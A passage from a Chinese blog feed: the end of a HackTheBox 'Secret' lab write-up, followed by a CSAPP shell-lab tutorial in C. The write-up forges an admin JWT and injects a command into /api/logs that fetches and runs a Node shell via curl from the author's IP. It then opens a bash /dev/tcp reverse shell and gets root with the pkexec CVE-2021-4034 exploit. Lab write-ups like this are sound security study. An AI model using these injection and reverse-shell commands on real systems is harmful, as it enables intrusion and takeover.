checkout</code>命令切换到该版本前，找到正确的token：<br><code>gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</code></p><p>先获取一个用户的JWT，然后用<a href="https://icyberchef.com/">cyberchef</a>使用token对JWT进行解码，修改JWT中的为<code>name</code>字段为<em>theadmin</em>之后再使用这个token<code>sign</code>获得JWT，便可以以admin的身份登录。<br><img src="https://s2.loli.net/2022/03/05/fGm8ZdQIngBsSOx.png" alt="image.png"><br><img src="https://s2.loli.net/2022/03/05/AoN1WaRtFl4ixqg.png" alt="image.png"><br>之后通过访问<code>/api/logs</code>执行命令得到用户flag。<br><img src="https://s2.loli.net/2022/03/05/WAGBiPkgCjNJdcS.png" alt="user.txt"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>直接在请求中bash或者nc反弹shell一直不成功，那就直接上传个shell吧。<br>参考此<a href="https://blog.csdn.net/Aaron_Miller/article/details/106825087">链接</a><br>使用这个文章的NodeJS shell，快速在本地18000端口开启一个http服务器<code>python3 -m http.server 18000</code>。然后请求<code>GET /api/logs?file=111;curl+10.10.16.3:18001/whoamiii.js|nodejs HTTP/1.1</code>获取到一个shell，之后输入<code>bash -i &gt;&amp; /dev/tcp/10.10.16.3/18002 0&gt;&amp;1</code>反弹一个稳定点的shell。</p><h1 id="root权限获取"><a href="#root权限获取" class="headerlink" title="root权限获取"></a>root权限获取</h1><p><code>find / -perm -4000 2&gt;/dev/null</code>查看具有suid权限的文件。<br><code>/usr/bin/pkexec</code>看起来有点意思，先执行一下看看。<br><img src="https://s2.loli.net/2022/03/20/beCVwa2MRTuYfUQ.png" alt="image.png"><br>报了个错，有可能是shell的问题，那么我们就生成SSH公钥来登录一下吧。<br><code>ssh-keygen</code>生成公钥后，使用<code>ssh -i ./key dasith@10.10.11.120</code>私钥登录到服务器。<br><img src="https://s2.loli.net/2022/03/20/6fjUXOo1bd89DTE.png" alt="image.png"><br>经过搜索pkexec≤0.120中存在权限提升漏洞，那么就确认提权点在这里了。<br>然后搜索到pkexec的一个POC<a href="https://github.com/berdav/CVE-2021-4034">CVE-2021-4034</a>，之后用这个POC便可以获得root权限。<br>由于靶机不能访问外网，所以需要将下载后的文件发送到靶机上面。<br>这里我先使用<code>tar -zcvf poc.tar CVE-2021-4034</code>将该文件夹打包为tar，然后python开启本地服务器，再从靶机上面下载该tar包。最后在靶机上面<code>tar -zxvf poc.tar</code>解压缩就可以。<br><img src="https://s2.loli.net/2022/03/20/tDmnlbhCKZkqRzs.png" alt="image.png"><br>按上面的步骤来就可以获取root权限。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次的靶机总体来说是很简单的，最大的收获是了解了下NodeJS项目的基本结构，熟悉了一下JWT的整个过程。至于这个CVE暂时还不想仔细地去了解，看了一下是关于缓存区溢出问题的，不是太吸引我(<del>主要是最近学的东西太多，整个人有点麻了</del>)。之后计划系统的学习一下JWT。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> Hackthebox </category>
          
          <category> easy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ExpressJS </tag>
            
            <tag> CVE-2021-4034 </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-shlab</title>
      <link href="/2022/02/27/CSAPP-shlab/"/>
      <url>/2022/02/27/CSAPP-shlab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h1><p>这个是CSAPP <a href="http://csapp.cs.cmu.edu/3e/labs.html">ECF</a>章节配套的一个实验，该实验的目的是写一个支持工作控制的Unix shell。我们需要做的是为提供的<code>tsh.c</code>框架增加更多的功能，每个功能对应一个函数，如下是需要我们写的函数以及大约所需要的行数。</p><ul><li><code>eval</code>解析和处理命令行 <em>70行</em></li><li><code>builtin_cmd</code>分辨并解释内置的命令：quit，fg，bg和jobs <em>25 行</em></li><li><code>do_bgfg</code>实现bg和fg内置命令 <em>50  行</em></li><li><code>waitfg</code>等待前台作业结束 <em>20 行</em></li><li><code>sigchld_handler</code>捕捉SIGCHILD信号 <em>80 行</em></li><li><code>sigint_handler</code>捕捉SIGINT(ctrl-c)信号 <em>15 行</em></li><li><code>sigstp_handler</code>捕捉SIGSTP(ctrl-z)信号 <em>15 行</em></li></ul><p>tsh需要满足的要求：</p><ul><li>提示符为<code>tsh&gt; </code></li><li>用户输入的命令应该包括一个命令和零个或多个参数，都由一个或多个空格分隔开。如果命令是一个内置命令，tsh应该立即执行并且等待下一个命令。否则，tsh假设该命令是可执行文件的路径，然后加载并运行在一个初始化的子进程中。</li><li>tsh不需要支持管道(|)或者I/O重定向(&gt;和&lt;)</li><li>ctrl-c(ctrl-z)键向当前的前台作业发送一个SIGINT(SIGTSTP)信号以，及其fork的所有子进程。如果没有前台作业，那么该信号应该没有任何作用</li><li>如果命令行以&amp;结尾，那么tsh将该作业在后台运行，否则在前台运行</li><li>每个作业可以由一个PID或者JID标识，这两个均为tsh分配的正整数。JID在命令行中加上前缀%表示。比如%5表示JID 5，5表示PID 5(实验已经提供了用于操作job表的例程)</li><li>tsh应该包含如下的内置命令：<ul><li><code>quit</code>终止shell进程</li><li><code>jobs</code>显示所有的后台作业</li><li><code>bg &lt;job&gt;</code>通过发送SIGCONT重启&lt;job&gt;，然后在后台运行，&lt;job&gt;可以是JID或PID</li><li><code>fg &lt;job&gt;</code>通过发送SIGCONT重启&lt;job&gt;，然后在前台运行。</li><li>tsh需要回收所有的僵尸子进程。如果任何一个作业因接收到未捕获的信号而终止（异常结束），那么tsh能够分辨出这个事件，并且输出作业的PID以及该信号说明。</li></ul></li></ul><p>工具的说明：</p><ul><li><code>tshref</code>shell的参考版本，输出应该与其一致</li><li><code>sdriver.pl</code>以子进程的方式运行shell，向其发送命令和信号并检查其输出。</li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>将实验分为7个阶段，每个阶段由编写其中的一个函数组成。</p><h2 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Dont do this</span></span><br><span class="line"><span class="comment">     * argv[0] == &quot;quit&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">       do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数主要是判断输入的指令是否为内置命令，如果为内置命令则执行相应的函数，否则返回0。<br>需要注意一点是，在判断argv参数列表时，不能直接将指向数组的指针与字符串常量比较。还有一点比较重要的是，C语言是区分单引号和双引号的，在进行字符串比较和赋值时要特别注意。</p><h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><p>编写程序时存在的误解：向前台发送SIGINT信号时，默认是向父进程也就是真正的前台作业shell发送信号，如果不更改默认动作，那么会直接终止shell。更改默认动作为信号处理函数后，如果想要运行在前台子进程终止则需要手动发送信号。因为我们模拟的是<code>ctrl-c</code>的效果，所以应该向前台进程所在的进程组发送信号。<br>首先判断存不存在前台作业</p><ol><li>存在；向子进程所在进程组发送<code>SIGINT</code>信号</li><li>不存在；直接返回</li></ol><p>理解错误的写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> *mask_all, *prev_all;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tsh&gt; Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, </span><br><span class="line">                job-&gt;pid, sig);</span><br><span class="line">        sigfillset(mask_all);</span><br><span class="line">        sigprocmask(SIG_BLOCK, mask_all, prev_all);</span><br><span class="line">        deletejob(jobs, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        unix_error(<span class="string">&quot;Error when receive SIGINT!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面代码是存在问题的，因为直接在<code>sigint_handler</code>函数中删除作业，是不会向目标进程发送终止信号的，也就是子进程还在运行并没有<strong>真正地</strong>被删除。<br>正确的写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="comment">// If No fg to process then normal return</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        kill(-pid, SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>kill</code>以及<code>-pid</code>向进程所在的前台进程组发送<code>SIGINT信号</code>，在访问全局变量<code>jobs</code>时要阻塞信号，防止不一致性情况的出现，其他函数也应该这样，在此之后就不在赘述。<br>在没有进程运行在前台时，应该恢复信号并直接返回。</p><h2 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all ,<span class="literal">NULL</span>);</span><br><span class="line">        kill(-pid, sig);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写方式与上面函数相同，这里就不再解释。</p><h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="comment">/* No need to wait all children */</span></span><br><span class="line">    <span class="comment">/* SIGSTP will stuck here, because child is not terminated</span></span><br><span class="line"><span class="comment">     * waitpid will wait until child eventually terminated</span></span><br><span class="line"><span class="comment">     * use WUNTRACED option can prevent this</span></span><br><span class="line"><span class="comment">     * use WNOHANG to prevent SIGCONT send SIGCHLD</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    pid = waitpid(<span class="number">-1</span>, &amp;status, WUNTRACED|WNOHANG);</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, </span><br><span class="line">                    job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, </span><br><span class="line">                    job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为一个子进程在终止和停止后都会向父进程发送<code>SIGCHLD</code>信号，所以当我们在<code>sigchld_handler</code>中处理该信号时应该注意这两种情况。</p><ol><li>子进程终止。<ul><li><code>WIFEXITED(status)</code>判断是否为正常终止，<code>exit</code>或<code>return</code></li><li><code>WIFSIGNALED(status)</code>判断是否因为其他未捕获(没有信号处理程序处理该信号)的信号而终止</li></ul></li><li>子进程停止运行<ul><li><code>WIFSTOPPED(status)</code>判断发送<code>SIGCHLD</code>信号的子进程当前状态是否为停止</li><li><code>waitpid</code>函数应该加入<code>WUNTRACED</code>选项，因为一个进程停止与终止是完全不同的，<code>waitpid</code>默认只在子进程终止或没有子进程时返回，所以不加该选项会导致程序卡死在这里。</li></ul></li><li>子进程收到<code>SIGCONT</code>重新运行，这时子进程同样会向父进程发送<code>SIGCHLD</code>信号，所以要加入<code>WNOHANG</code>选项避免程序卡死。</li><li>为了避免出现书中描述的多个子进程同时终止造成信号丢失的情况，可以加入while循环判断<code>waitpid</code>函数返回情况，要注意我们不能永远地等待子进程终止，所以需要<code>WNOHANG</code>选项。</li></ol><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>该函数应该有以下的功能：</p><ul><li>输入不存在的命令时能够被正常的处理</li><li>非内置命令则创建子进程去执行<ul><li>是否后台运行</li></ul></li><li>内置命令直接执行并输出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* holds parsed command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg; <span class="comment">/* background? decided by parseline func */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid; <span class="comment">/* child PID */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> prev_one, mask_all, mask_one;</span><br><span class="line">     </span><br><span class="line">    bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        sigemptyset(&amp;mask_one);</span><br><span class="line">        sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">        sigfillset(&amp;mask_all);</span><br><span class="line">        <span class="comment">// Block SIGCHILD to prevent race condition</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Unblock SIGCHLD</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">// Only child will receive keyboard interrupt</span></span><br><span class="line">            <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">                unix_error(<span class="string">&quot;Set group id error!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found!\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!bg)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* Parent add job to list and wait for foreground child*/</span></span><br><span class="line">                sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">                addjob(jobs, pid, FG, cmdline);</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="comment">// child exit before this, will waiting forever?</span></span><br><span class="line">                waitfg(pid);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">                addjob(jobs, pid, BG, cmdline);</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job_bg</span>;</span></span><br><span class="line">                job_bg = getjobpid(jobs, pid);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job_bg-&gt;jid, pid, cmdline);</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该要注意的地方：</p><ul><li>在创建子进程之前要阻塞<code>SIGCHLD</code>信号，避免父进程在将子进程加入作业列表之前子进程结束，从而删除不存在的作业。同时因为子进程会继承父进程的阻塞信号集，所以应该在子进程中解除阻塞信号</li><li>如果外置命令在前台运行，那么要阻塞前台进程</li><li>要将子进程加入作业列表并且根据前台和后台运行情况设置其状态位</li></ul><p> 问题：在前台条件分支中，<code>waitfg</code>函数会存在条件竞争的情况，如果在<code>sigsuspend</code>运行之前子进程发送了<code>SIGCHLD</code>信号并被处理，那么进程将会永远的陷入休眠状态。虽然理论上会遇到这种情况，但是实际运行时并没有出现过，可是这样的问题终究会出现只不过概率低，欢迎各位在评论中提出自己的想法。</p><h2 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> *mask, *prev;</span><br><span class="line">    sigfillset(mask);</span><br><span class="line">    sigprocmask(SIG_BLOCK, mask, prev);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">fg_job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">    <span class="comment">// fgpid == pid why cant work</span></span><br><span class="line">    <span class="keyword">while</span> (fg_job &amp;&amp; fg_job-&gt;state == FG)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="comment">/* Always reutnr -1 */</span></span><br><span class="line">         <span class="comment">// 错误的赋值方式，mask未被分配空间 不会正常地阻塞进程</span></span><br><span class="line">         <span class="keyword">if</span> (sigsuspend(prev) != <span class="number">-1</span>)</span><br><span class="line">         &#123;</span><br><span class="line">            unix_error(<span class="string">&quot;Wait foreground job error!\n&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, prev, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不可以单独使用<code>fgpid == pid</code>来判断该pid是否为前台作业，因为如果在一个前台作业停止之前获取其pid，该前台作业停止后这个pid还是不会变的，这样循环就会永远的进行下去。更加准确的方法应该是判断该作业是否存在，并及时查看其当前状态是否为FG，也就是foreground。<br>上面的程序是错误的，<code>sigsuspend</code>函数不会阻塞主进程(shell)，因为结构体指针初始值为地址，此时并没有分配空间该指针也就没有指向真实的地址，而定义结构体则提前分配了空间。<br>所以如果定义结构体指针则需要如下的步骤：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sigset_t</span> *mask, *prev;</span><br><span class="line">mask = (<span class="keyword">sigset_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">sigset_t</span>));</span><br></pre></td></tr></table></figure><p>正确的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 